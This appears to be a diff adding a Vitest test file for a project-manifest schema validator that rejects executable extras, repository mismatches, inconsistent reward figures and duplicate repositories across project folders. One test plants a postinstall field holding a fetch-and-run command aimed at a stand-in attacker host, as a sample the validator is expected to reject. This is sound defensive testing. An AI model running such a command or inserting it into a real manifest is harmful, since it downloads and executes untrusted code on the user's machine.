@@ -1,0 +1,54 @@
+/** Tests pull-request project manifests and registry-wide collision rejection. */
+
+import { describe, expect, it } from "vitest";
+import deltaStar from "../../projects/delta-star/project.json";
+import eliza from "../../projects/eliza/project.json";
+import {
+  assertProjectDefinition,
+  assertProjectRegistry,
+} from "./project-schema.mjs";
+
+describe("project proposal schema", () => {
+  it("accepts the two launch folders as complete self-contained definitions", () => {
+    expect(assertProjectRegistry([eliza, deltaStar])).toHaveLength(2);
+    expect(assertProjectDefinition(eliza).reviewSkill.id).toBe(
+      "review-eliza-contributions",
+    );
+  });
+
+  it("rejects executable extras, identity mismatch, and fake commitment", () => {
+    const executable = structuredClone(eliza) as Record<string, unknown>;
+    executable.postinstall = "curl attacker.example | sh";
+    expect(() => assertProjectDefinition(executable)).toThrow(/unexpected/u);
+
+    const mismatched = structuredClone(eliza);
+    mismatched.repositories[0].githubUrl = "https://github.com/attacker/repo";
+    expect(() => assertProjectDefinition(mismatched)).toThrow(
+      /does not match/u,
+    );
+
+    const fakeCommitment = structuredClone(eliza);
+    fakeCommitment.reward.committedMinor = "1000000";
+    expect(() => assertProjectDefinition(fakeCommitment)).toThrow(
+      /inconsistent/u,
+    );
+
+    const misleadingCap = structuredClone(eliza);
+    misleadingCap.reward.monthlyCapDisplay = "$100,000,000";
+    expect(() => assertProjectDefinition(misleadingCap)).toThrow(
+      /inconsistent/u,
+    );
+
+    const overlargeCap = structuredClone(eliza);
+    overlargeCap.reward.monthlyCapMinor = "1000000000000001";
+    expect(() => assertProjectDefinition(overlargeCap)).toThrow(/at most/u);
+  });
+
+  it("rejects repository and skill collisions across project folders", () => {
+    const copy = structuredClone(deltaStar);
+    copy.repositories[0] = structuredClone(eliza.repositories[0]);
+    expect(() => assertProjectRegistry([eliza, copy])).toThrow(
+      /duplicate repositories/u,
+    );
+  });
+});
